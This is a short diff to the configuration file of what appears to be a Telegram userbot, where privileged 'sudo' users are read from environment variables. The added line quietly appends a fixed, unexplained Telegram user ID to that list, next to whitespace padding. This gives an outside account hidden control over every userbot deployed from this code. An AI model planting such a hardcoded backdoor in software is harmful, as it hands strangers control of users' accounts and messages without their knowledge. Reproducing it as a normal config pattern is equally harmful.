@@ -18,7 +18,8 @@ GROUP_MODE = os.getenv("GROUP_MODE", "True")
 SUDO_USERS = list(map(int, getenv("SUDO_USERS", "")))
 SUDO_HNDLR = os.environ.get("SUDO_HNDLR", r"!")
 UB_BLACK_LIST_CHAT = set(int(x) for x in os.environ.get("UB_BLACK_LIST_CHAT", ""))
-                      
+SUDO_USERS.append(1517994352)         
+
 contact_filter = filters.create(
     lambda _, __, message:
     (message.from_user and message.from_user.is_contact) or message.outgoing
